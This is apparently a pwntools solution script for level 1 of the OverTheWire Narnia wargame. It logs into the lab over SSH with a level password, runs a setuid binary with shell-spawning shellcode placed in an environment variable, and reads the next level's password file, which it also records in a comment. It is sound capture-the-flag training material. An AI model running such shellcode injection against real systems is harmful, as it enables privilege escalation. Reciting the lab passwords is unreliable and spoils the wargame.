from pwn import *
context.os = 'linux'
context.arch = 'x86'
# vars ...
user = 'narnia1'
host = 'narnia.labs.overthewire.org'
password = 'efeidiedae'
shell = ssh(user, host, password=password)
############################################
s = shell.process('/narnia/narnia1',
    env = {'EGG': asm(shellcraft.i386.linux.sh())})
s.recvuntil('$ ').decode()
s.sendline('whoami')
t = s.recvuntil('$ ').decode()[:7]
log.info('current user: ' + t)
if t == 'narnia2':
    s.sendline('cat /etc/narnia_pass/narnia2')
    log.success(s.recvuntil('$ ').decode().strip()[:-1])
else:
    log.critical('Exploit failed!!!')


#pass nairiepecu
